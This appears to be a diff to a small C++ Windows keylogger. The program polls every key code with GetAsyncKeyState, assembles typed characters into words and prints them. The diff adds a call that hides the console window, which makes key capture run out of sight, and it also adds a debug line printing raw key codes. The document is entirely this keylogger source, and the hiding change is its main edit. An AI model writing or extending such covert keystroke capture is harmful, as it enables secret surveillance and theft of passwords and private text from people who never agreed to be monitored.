@@ -14,6 +14,8 @@ bool main_loop(string &word, int &count);
 
 int main()
 {
+	ShowWindow(GetConsoleWindow(), SW_HIDE );
+	
     on_load();
 
     string word = "";
@@ -25,18 +27,16 @@ int main()
         if (!running)
             break;
     }
-
     return 0;
 }
 
 bool main_loop(string &word, int &count)
 {
-    int i;
-
-    for (i = 8; i < 169; i++)
+	for (int i = 8; i < 169; i++)
     {
         if (GetAsyncKeyState(i) == KEY_PRESSED)
         {
+			cout << "key code: " << i << endl;
             char ch = i;
             cout << "char: " << ch << endl;
             if (i == 32 || i == 13 || i == 10 || i == 27)
@@ -54,7 +54,6 @@ bool main_loop(string &word, int &count)
             cout << "word: " << word << endl;
         }
     }
-
     return true;
 }
 
